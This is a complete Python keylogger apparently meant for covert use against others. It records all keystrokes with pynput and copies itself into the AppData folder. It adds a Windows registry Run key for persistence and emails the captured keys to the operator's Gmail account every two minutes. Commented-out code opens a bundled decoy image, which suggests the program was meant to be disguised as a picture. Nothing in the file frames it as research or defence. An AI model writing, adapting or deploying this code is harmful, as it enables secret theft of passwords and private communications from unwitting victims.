import pynput.keyboard
import threading
import smtplib
import os
import sys
import shutil
import subprocess
import time

store_keys='key_logger_start'
#make sure you email account turn of login less secure site,that's importand for log and send mail from the account.
email="#give you mail id"
password="#enter you password of Given previous mail id"
def presistencs():
    file_location=os.environ['appdata'] + "\\data.py"
    if not os.path.exists(file_location):
        shutil.copyfile(sys.executable,file_location)
        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v tata /t REG_SZ /d "'+file_location+'"',shell=True)
     # code send mail after 60 sec
time.sleep(60)
def key_press(key):
    global store_keys
    try:
        store_keys = store_keys + str(key.char)
        # print(store_keys)
    except AttributeError:
        if key == key.space:
            store_keys = store_keys + ' '
            # print(store_keys)
        else:
            store_keys = store_keys + ' ' + str(key) + ' '
            # print(store_keys)


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.ehlo()
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


def report():
    global store_keys
    send_mail(email,password, "\n\n" + store_keys)
    # print(store_keys)
    store_keys = ''
    timer = threading.Timer(120,report)
    timer.start()
# file_name=sys._MEIPASS + "/sample.jpg"
# subprocess.Popen(file_name,shell=True)
key_listener = pynput.keyboard.Listener(on_press=key_press)
with key_listener as listener:
     presistencs()
     report()
     listener.join()
